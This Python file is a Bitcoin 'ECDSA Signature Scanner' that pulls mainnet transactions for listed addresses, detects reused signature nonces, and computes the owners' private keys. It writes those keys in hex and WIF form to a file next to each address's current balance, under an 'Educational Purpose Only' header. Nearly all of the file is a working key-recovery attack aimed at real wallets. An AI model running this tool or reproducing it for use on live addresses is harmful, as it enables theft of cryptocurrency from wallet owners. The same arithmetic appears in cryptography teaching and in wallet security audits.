#!/usr/bin/env python3

import hashlib
import os
import time
from collections import defaultdict
from datetime import datetime

import requests
from bitcoinutils.script import Script
from bitcoinutils.setup import setup
from bitcoinutils.transactions import Transaction
from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TaskProgressColumn, TextColumn
from rich.table import Table
from rich.text import Text

console = Console()
setup("mainnet")

N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


class ECDSASignatureScanner:
    def __init__(self, address: str):
        self.address = address
        self.api_base = "https://blockchain.info"
        self.data = None
        self.signatures = []
        self.reused_signatures = []

    def fetch_address_data(self) -> bool:
        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
                transient=True,
            ) as progress:
                task = progress.add_task("[cyan]Fetching transaction data...", total=None)
                url = f"{self.api_base}/rawaddr/{self.address}?limit=100"
                response = requests.get(url, timeout=15)

                if response.status_code == 200:
                    self.data = response.json()
                    progress.update(task, advance=1)
                    return True

                console.print(f"[red]✗ API Error: Status {response.status_code}[/red]")
                return False
        except requests.exceptions.RequestException as exc:
            console.print(f"[red]✗ Network Error: {exc}[/red]")
            return False

    def fetch_raw_transaction(self, tx_hash: str):
        try:
            url = f"{self.api_base}/rawtx/{tx_hash}?format=hex"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                return response.text.strip()
            return None
        except requests.exceptions.RequestException:
            return None

    @staticmethod
    def _read_pushdata(script_hex: str, offset: int):
        if offset + 2 > len(script_hex):
            return None, offset

        opcode = int(script_hex[offset : offset + 2], 16)
        offset += 2

        if opcode <= 75:
            data_len = opcode * 2
        elif opcode == 76:
            if offset + 2 > len(script_hex):
                return None, offset
            data_len = int(script_hex[offset : offset + 2], 16) * 2
            offset += 2
        elif opcode == 77:
            if offset + 4 > len(script_hex):
                return None, offset
            data_len = int.from_bytes(bytes.fromhex(script_hex[offset : offset + 4]), "little") * 2
            offset += 4
        else:
            return None, offset

        if offset + data_len > len(script_hex):
            return None, offset

        data = script_hex[offset : offset + data_len]
        return data, offset + data_len

    def parse_script_sig(self, script_hex: str):
        try:
            if not script_hex or len(script_hex) < 4:
                return None

            signature, offset = self._read_pushdata(script_hex, 0)
            if not signature:
                return None

            pubkey, _ = self._read_pushdata(script_hex, offset)
            result = {"signature": signature}
            if pubkey:
                result["pubkey"] = pubkey
            return result
        except (ValueError, IndexError):
            return None

    def parse_der_signature(self, sig_hex: str):
        try:
            if not sig_hex or len(sig_hex) < 14:
                return None

            offset = 0
            if sig_hex[offset : offset + 2] != "30":
                return None
            offset += 2

            total_length = int(sig_hex[offset : offset + 2], 16)
            offset += 2
            if (total_length * 2) > (len(sig_hex) - 4):
                return None

            if sig_hex[offset : offset + 2] != "02":
                return None
            offset += 2

            r_length = int(sig_hex[offset : offset + 2], 16) * 2
            offset += 2
            r = sig_hex[offset : offset + r_length]
            offset += r_length

            if sig_hex[offset : offset + 2] != "02":
                return None
            offset += 2

            s_length = int(sig_hex[offset : offset + 2], 16) * 2
            offset += 2
            s = sig_hex[offset : offset + s_length]
            offset += s_length

            sighash = sig_hex[offset : offset + 2] if offset + 2 <= len(sig_hex) else "01"
            return {
                "r": r,
                "s": s,
                "sighash": sighash,
                "r_int": int(r, 16),
                "s_int": int(s, 16),
            }
        except (TypeError, ValueError, IndexError):
            return None

    def calculate_sighash(self, raw_tx_hex: str, input_index: int, prev_script_hex: str):
        try:
            tx = Transaction.from_raw(raw_tx_hex)
            prev_script = Script.from_raw(prev_script_hex)
            digest = tx.get_transaction_digest(input_index, prev_script)
            return int.from_bytes(digest, "big")
        except Exception:
            return None

    def extract_signatures_from_transactions(self):
        if not self.data or "txs" not in self.data:
            return

        total_txs = len(self.data.get("txs", []))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console,
            transient=True,
        ) as progress:
            task = progress.add_task(f"[cyan]Processing {total_txs} transactions...", total=total_txs)

            for tx in self.data.get("txs", []):
                tx_hash = tx.get("hash", "")
                raw_tx = self.fetch_raw_transaction(tx_hash)
                if not raw_tx:
                    progress.update(task, advance=1)
                    continue

                for input_idx, inp in enumerate(tx.get("inputs", [])):
                    script = inp.get("script", "")
                    prev_out = inp.get("prev_out", {})

                    if prev_out.get("addr") != self.address:
                        continue

                    parts = self.parse_script_sig(script)
                    if not parts or "signature" not in parts:
                        continue

                    sig_data = self.parse_der_signature(parts["signature"])
                    if not sig_data:
                        continue

                    prev_script = prev_out.get("script", "")
                    z_value = self.calculate_sighash(raw_tx, input_idx, prev_script) if prev_script else None

                    self.signatures.append(
                        {
                            "tx_hash": tx_hash,
                            "input_index": input_idx,
                            "r": sig_data["r"],
                            "s": sig_data["s"],
                            "r_int": sig_data["r_int"],
                            "s_int": sig_data["s_int"],
                            "sighash": sig_data["sighash"],
                            "pubkey": parts.get("pubkey", ""),
                            "script": script,
                            "z": z_value,
                            "prev_script": prev_script,
                        }
                    )

                progress.update(task, advance=1)
                if progress.tasks[0].completed and (progress.tasks[0].completed % 10) == 0:
                    time.sleep(0.5)

    def find_signature_reuse(self):
        r_value_map = defaultdict(list)
        for sig in self.signatures:
            r_value_map[sig["r"]].append(sig)

        for r_value, sigs in r_value_map.items():
            if len(sigs) < 2:
                continue
            sigs_with_z = [s for s in sigs if s["z"] is not None]
            if len(sigs_with_z) >= 2:
                self.reused_signatures.append(
                    {"r": r_value, "r_int": sigs_with_z[0]["r_int"], "signatures": sigs_with_z}
                )

        return len(self.reused_signatures) > 0

    def mod_inverse(self, a, m):
        if a < 0:
            a = (a % m + m) % m

        def extended_gcd(x, y):
            if x == 0:
                return y, 0, 1
            gcd, x1, y1 = extended_gcd(y % x, x)
            return gcd, y1 - (y // x) * x1, x1

        gcd, x, _ = extended_gcd(a % m, m)
        if gcd != 1:
            return None
        return (x % m + m) % m

    def derive_private_key(self, sig1, sig2):
        try:
            r = sig1["r_int"]
            s1, s2 = sig1["s_int"], sig2["s_int"]
            z1, z2 = sig1["z"], sig2["z"]
            if z1 is None or z2 is None or z1 == z2:
                return None

            numerator = (z1 - z2) % N
            denominator = (s1 - s2) % N
            if denominator == 0:
                return None

            denominator_inv = self.mod_inverse(denominator, N)
            if denominator_inv is None:
                return None

            k = (numerator * denominator_inv) % N
            r_inv = self.mod_inverse(r, N)
            if r_inv is None:
                return None

            private_key = ((s1 * k - z1) % N * r_inv) % N
            private_key_check = ((s2 * k - z2) % N * r_inv) % N
            if private_key == private_key_check and private_key > 0:
                return {
                    "private_key_hex": hex(private_key)[2:].zfill(64),
                    "private_key_dec": str(private_key),
                    "k": hex(k)[2:].zfill(64),
                }
            return None
        except (KeyError, TypeError, ValueError):
            return None

    def analyze_reused_signatures(self):
        results = []
        for reuse_case in self.reused_signatures:
            sigs = reuse_case["signatures"]
            if len(sigs) >= 2:
                private_key_data = self.derive_private_key(sigs[0], sigs[1])
                results.append(
                    {
                        "r": reuse_case["r"],
                        "r_int": reuse_case["r_int"],
                        "signatures": sigs,
                        "private_key": private_key_data,
                    }
                )
        return results

    def private_key_to_wif(self, private_key_hex):
        try:
            import base58

            extended = "80" + private_key_hex + "01"
            hash1 = hashlib.sha256(bytes.fromhex(extended)).digest()
            hash2 = hashlib.sha256(hash1).digest()
            checksum = hash2[:4].hex()
            return base58.b58encode(bytes.fromhex(extended + checksum)).decode("utf-8")
        except Exception:
            return "N/A"

    def save_results_to_file(self, results):
        try:
            mode = "a" if os.path.exists("reusedINFO.txt") else "w"
            with open("reusedINFO.txt", mode, encoding="utf-8") as f:
                if mode == "w":
                    f.write("ECDSA SIGNATURE REUSE - VULNERABLE ADDRESSES\n")
                    f.write("Educational Purpose Only\n")
                    f.write("=" * 70 + "\n\n")

                total_received = self.data.get("total_received", 0) / 1e8 if self.data else 0
                final_balance = self.data.get("final_balance", 0) / 1e8 if self.data else 0

                for result in results:
                    if result["private_key"]:
                        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
                        f.write(f"Address: {self.address}\n")
                        f.write(f"Balance: {final_balance:.8f} BTC\n")
                        f.write(f"Total Received: {total_received:.8f} BTC\n")
                        f.write(f"Private Key (Hex): {result['private_key']['private_key_hex']}\n")
                        wif = self.private_key_to_wif(result["private_key"]["private_key_hex"])
                        f.write(f"Private Key (WIF): {wif}\n")
                        f.write("-" * 70 + "\n\n")
            console.print("[green]✓ Results saved to reusedINFO.txt[/green]")
            return True
        except OSError as exc:
            console.print(f"[red]✗ Error saving results: {exc}[/red]")
            return False


def load_addresses_from_file(filename="list.txt"):
    try:
        if not os.path.exists(filename):
            console.print(f"[red]✗ File '{filename}' not found![/red]")
            console.print(f"[yellow]Creating example {filename}...[/yellow]\n")
            with open(filename, "w", encoding="utf-8") as f:
                f.write("15ArtCgi3wmpQAAfYx4riaFmo4prJA4VsK\n")
            console.print(f"[green]✓ Created {filename} with example address[/green]")
            console.print("[cyan]Please add your Bitcoin addresses (one per line) and run again.[/cyan]\n")
            return []

        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except OSError as exc:
        console.print(f"[red]✗ Error reading file: {exc}[/red]")
        return []


if __name__ == "__main__":
    console.print(
        Panel(
            Text("This module contains core scanner logic. Integrate with your existing CLI workflow."),
            title="ECDSA Signature Scanner",
            border_style="cyan",
            box=box.ROUNDED,
        )
    )
